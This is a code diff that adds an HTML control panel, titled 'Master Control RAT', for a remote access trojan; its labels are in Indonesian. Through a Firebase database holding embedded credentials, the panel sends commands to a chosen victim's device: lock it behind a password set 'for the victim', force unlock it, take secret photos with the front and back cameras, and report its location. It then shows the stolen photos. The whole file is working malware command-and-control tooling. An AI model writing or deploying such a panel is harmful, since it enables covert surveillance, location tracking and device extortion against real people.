@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Master Control RAT</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <style>
+        body { background: #050505; color: #00ff00; font-family: monospace; padding: 20px; }
+        .card { background: #111; border: 1px solid #00ff00; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
+        button { width: 100%; padding: 12px; margin: 5px 0; background: #003300; color: #0f0; border: 1px solid #0f0; font-weight: bold; }
+        input { width: 100%; padding: 10px; margin: 5px 0; background: #000; color: #0f0; border: 1px solid #333; box-sizing: border-box; }
+        img { width: 100%; margin-top: 10px; border: 1px solid #0f0; }
+    </style>
+</head>
+<body>
+
+    <h2>OMNI-COMMAND RAT</h2>
+
+    <div class="card">
+        <label>ID TARGET:</label>
+        <input type="text" id="targetID" placeholder="Contoh: Target_1234">
+    </div>
+
+    <div class="card">
+        <h3>SECURITY LOCK</h3>
+        <input type="text" id="passLock" placeholder="Set Password Unlock untuk korban">
+        <button onclick="sendComplexCmd('lock')" style="background:red; color:white;">LOCK DEVICE</button>
+        <button onclick="sendCmd('unlock')" style="background:white; color:black;">FORCE UNLOCK</button>
+    </div>
+
+    <div class="card">
+        <h3>KONTROL SADAP</h3>
+        <button onclick="sendCmd('front')">FOTO DEPAN</button>
+        <button onclick="sendCmd('back')">FOTO BELAKANG</button>
+        <button onclick="sendCmd('loc')">CEK LOKASI</button>
+    </div>
+
+    <div class="card">
+        <h3>MONITORING</h3>
+        <div id="res"></div>
+        <img id="imgRes">
+    </div>
+
+    <script>
+      const firebaseConfig = {
+    apiKey: "AIzaSyAS9ZCVt6iFXY8Ksd0o5z7fjXg3qi8rfhU",
+    authDomain: "remote-control-9bf2c.firebaseapp.com",
+    databaseURL: "https://remote-control-9bf2c-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "remote-control-9bf2c",
+    storageBucket: "remote-control-9bf2c.firebasestorage.app",
+    messagingSenderId: "71798344189",
+    appId: "1:71798344189:web:6cdb414c1eab16c6b9b194"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function sendCmd(cmd) {
+            const id = document.getElementById('targetID').value;
+            db.ref('rat/' + id + '/command').set(cmd);
+            listen(id);
+        }
+
+        function sendComplexCmd(action) {
+            const id = document.getElementById('targetID').value;
+            const pass = document.getElementById('passLock').value || "1234";
+            db.ref('rat/' + id + '/command').set({ action: action, pass: pass });
+        }
+
+        function listen(id) {
+            db.ref('rat/' + id + '/shots').limitToLast(1).on('value', s => {
+                const d = s.val(); if(d) {
+                    const k = Object.keys(d)[0];
+                    document.getElementById('imgRes').src = d[k].img;
+                }
+            });
+        }
+    </script>
+</body>
+</html>
